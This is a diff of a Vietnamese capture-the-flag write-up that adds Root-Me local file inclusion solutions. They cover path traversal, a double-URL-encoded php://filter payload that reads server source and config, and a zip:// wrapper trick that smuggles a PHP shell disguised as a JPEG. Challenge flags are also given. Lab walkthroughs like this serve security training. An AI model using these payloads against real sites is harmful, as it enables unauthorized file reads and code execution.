@@ -18,10 +18,9 @@
     - [4. Lab: Web shell upload via extension blacklist bypass](#pulv4)
     - [5. Lab: Web shell upload via obfuscated file extension](#pulv5)
     - [6. Lab: Remote code execution via polyglot web shell upload](#pulv6)
-    - [7. Lab: Web shell upload via race condition](#pulv7)
 
 * [Root me - Upload file](#rootme-upload-file)
-* [Root me]()
+* [Root me - Local file inclusion](#rlfi)
 * [Tryhackme - dogcat](#tryhackme-dogcat)
 
 # Chết.vn<a name="chetvn"></a>
@@ -555,4 +554,163 @@ Giờ nhấn vào index.txt là thực hiện được liên kết về file ind
 Your friend who is a photography fan has created a site to allow people to share their beautiful photos. He assures you that his site is secure because he checks that the file sent is a JPEG, and that it is not a disguised PHP file. Prove him wrong
 
 ```
-Gợi ý rất rõ ràng, bạn là người song ngữ ? Chall này thì cũng giống với chall polyglot của portswigger, có lẽ ta cần phải upload 2 file
+# Rootme - Local file inclusion <a name='rlfi'></a> 
+
+## 1. Local file inclusion
+
+
+Ở bài này ta có giao diện như sau:
+
+![image](https://user-images.githubusercontent.com/104350480/223313079-ed47a20d-c5fd-497c-9933-9e65055a0bee.png)
+
+Có vẻ trang web cho ta liệt kê ra một số file, dùng path traversal để lùi thư mục về 1 ô xem thế nào:
+
+![image](https://user-images.githubusercontent.com/104350480/223313254-e1d7e6ba-f377-44d0-ad46-06c2eb18746e.png)
+
+Mục tiêu của ta là truy cập file index.php nhưng mà phải của th admin, giờ quay về path bth mà mở 1 file bất kì, rồi lùi 2 lần là được: 
+
+![image](https://user-images.githubusercontent.com/104350480/223313553-a35389a1-b185-427b-9495-f2179612d1c6.png)
+
+Ta được mật khẩu của admin trong file luôn:
+
+> Flag: OpbNJ60xYpvAQU8
+
+## 2. Local File Inclusion - Double encoding
+
+Đầu vào ta có giao diện thế này:
+
+![image](https://user-images.githubusercontent.com/104350480/223316697-c0bb3d26-e3ce-4927-b966-ec9aa647248f.png)
+
+
+Bài này thử path traversal bằng 1 vài phát thì kh được, như tên bài thì nó là double encoding ấy, thì khả năng là phải double encoding hết lên thì mới
+bypass được, nhưng cũng kh bypass được gì. Thì ở đây là phải dùng 1 kĩ thuật để khai thác là php wrapper có dạng:
+> php://filter/convert.base64-encode/resource=
+
+Cách tấn công này sẽ mã hóa tệp tin dạng base64 và cố gắng đọc nội dung của tệp tin trên máy chủ. Nhưng mà bài này có dùng decode url hay sao ấy, filter
+hết các dấu : // . - , nên ở đây ta encode url 2 lần là được:
+
+> ?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource=cv
+
+Ta được trả về kết quả: 
+
+```
+PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIENWPC90aXRsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8Pz0gJGNvbmZbJ2dsb2JhbF9zdHlsZSddID8+CiAgICA8bmF2PgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1ob21lIj5Ib21lPC9hPgogICAgICA8YSBocmVmPSJpbmRleC5waHA/cGFnZT1jdiIgY2xhc3M9ImFjdGl2ZSI+Q1Y8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWNvbnRhY3QiPkNvbnRhY3Q8L2E+CiAgICA8L25hdj4KICAgIDxoMT48Pz0gJGNvbmZbJ2NvbnRhY3QnXVsnZmlyc3RuYW1lJ10gPz4gPD89ICRjb25mWydjb250YWN0J11bJ2xhc3RuYW1lJ10gPz48L2gxPgogICAgPGgzPlByb2Zlc3Npb25hbCBkb2VyPC9oMz4KICAgIDw/PSAkY29uZlsnY3YnXVsnZ2VuZGVyJ10gPyAiTWFsZSIgOiAiRmVtYWxlIiA/Pjxicj4KICAgIDw/PSBkYXRlKCdZL20vZCcsICRjb25mWydjdiddWydiaXJ0aCddKSA/PiAoPD89IGRhdGUoJ1knKS1kYXRlKCdZJywgJGNvbmZbJ2N2J11bJ2JpcnRoJ10pID8+KQogICAgPD9waHAKICAgICAgZm9yZWFjaCAoJGNvbmZbJ2N2J11bJ2pvYnMnXSBhcyAkam9iKSB7CiAgICA/PgogICAgICA8ZGl2IGNsYXNzPSJqb2IiPgogICAgICAgIDxoND48Pz0gJGpvYlsndGl0bGUnXSA/PiAtIDxzcGFuIGNsYXNzPSJkYXRlIj48Pz0gJGpvYlsnZGF0ZSddID8+PC9zcGFuPjwvaDQ+CiAgICAgIDwvZGl2PgogICAgPD9waHAKICAgICAgfQogICAgPz4KICA8L2JvZHk+CjwvaHRtbD4K
+
+```
+Decode ngược lại ta được: 
+
+```
+<?php include("conf.inc.php"); ?>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>J. Smith - CV</title>
+  </head>
+  <body>
+    <?= $conf['global_style'] ?>
+    <nav>
+      <a href="index.php?page=home">Home</a>
+      <a href="index.php?page=cv" class="active">CV</a>
+      <a href="index.php?page=contact">Contact</a>
+    </nav>
+    <h1><?= $conf['contact']['firstname'] ?> <?= $conf['contact']['lastname'] ?></h1>
+    <h3>Professional doer</h3>
+    <?= $conf['cv']['gender'] ? "Male" : "Female" ?><br>
+    <?= date('Y/m/d', $conf['cv']['birth']) ?> (<?= date('Y')-date('Y', $conf['cv']['birth']) ?>)
+    <?php
+      foreach ($conf['cv']['jobs'] as $job) {
+    ?>
+      <div class="job">
+        <h4><?= $job['title'] ?> - <span class="date"><?= $job['date'] ?></span></h4>
+      </div>
+    <?php
+      }
+    ?>
+  </body>
+</html>
+
+```
+
+Ta có thể thấy web server sẽ đọc và thực thi file nếu conf được truyền vào, vì mình thử thì nó tự dộng thêm .inc.php vào, oke thế thì tốt rồi: 
+
+> ?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource=conf
+
+Ta được thông điệp base64 trả về và decode thì được:
+
+```
+<?php
+  $conf = [
+    "flag"        => "Th1sIsTh3Fl4g!",
+    "home"        => '<h2>Welcome</h2>
+    <div>Welcome on my personal website !</div>',
+    "cv"          => [
+      "gender"      => true,
+      "birth"       => 441759600,
+      "jobs"        => [
+        [
+          "title"     => "Coffee developer @Megaupload",
+          "date"      => "01/2010"
+        ],
+        [
+          "title"     => "Bed tester @YourMom's",
+          "date"      => "03/2011"
+        ],
+        [
+          "title"     => "Beer drinker @NearestBar",
+          "date"      => "10/2014"
+        ]
+      ]
+    ],
+    "contact"       => [
+      "firstname"     => "John",
+      "lastname"      => "Smith",
+      "phone"         => "01 33 71 00 01",
+      "mail"          => "john.smith@thegame.com"
+    ],
+    
+
+```
+> Flag: Th1sIsTh3Fl4g!
+
+## 3. Local File Inclusion - Wrappers
+
+![image](https://user-images.githubusercontent.com/104350480/223317354-40fb805b-22e9-4710-9ab4-06df4a615b84.png)
+
+Bài này cho ta upload file, nhưng mà filter sạch sành sang. Thì ý tưởng vẫn là phải upload file php, mà phải là đuôi jpg, vì vậy sau khi tìm hiểu được
+thì ý tưởng ở đây là ta sẽ zip file lại dưới dạng jpg luôn, để sau khi được giải nén nó sẽ về cái file shell ban đầu:
+
+![image](https://user-images.githubusercontent.com/104350480/223317983-8e0f2370-6209-4f49-b37e-45b37ed3fd7e.png)
+
+Và upload thành công, check source ta được link tới đường dẫn: 
+
+![image](https://user-images.githubusercontent.com/104350480/223318045-42c6f47a-43e7-4f60-ab5a-fde4b8b3688d.png)
+
+Tiếp theo ta tìm đường dẫn đến file thông qua zip://tmp/upload/9AAWKLg8p.jpg và #2.php để chỉ ra vị trí tương đối trong đường dẫn tuyệt đối đang được xét
+ở phía trước, nhưng bài này nó tự động thêm .php vào cuối rồi nên thử lại bỏ đi .php đi, mà có vẻ có lỗi: 
+
+![image](https://user-images.githubusercontent.com/104350480/223319724-f79f692f-ed49-4f11-8a25-1910e8921d86.png)
+
+Vậy là system không dùng được ở đây, thế thì ta sẽ sửa lại payload thực thi khác là được    
+
+![image](https://user-images.githubusercontent.com/104350480/223320492-33326987-93d8-4b54-973a-c245aef74726.png)
+
+Có source code trả về luôn: 
+
+![image](https://user-images.githubusercontent.com/104350480/223320691-c3b60548-5829-40e2-95bb-04a35fc4d1b4.png)
+
+Nhưng chả để làm gì. giờ làm thế nào mà kh dựa vào system để đọc đựa tập tin của nó hay thực thi lệnh để kiếm thì mới được, chứ mò thế này hơi khó.
+
+Ở đây có thể áp dụng scandir trong php, áp dụng trả về mảng tên file hoặc thư mục directory đã cho, sửa lại lệnh: 
+
+
+
+
+![image](https://user-images.githubusercontent.com/104350480/223319378-3716bf42-5154-4ce4-b9c2-b2f3650732c5.png)
+
+
+> reference: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+
+
+
+
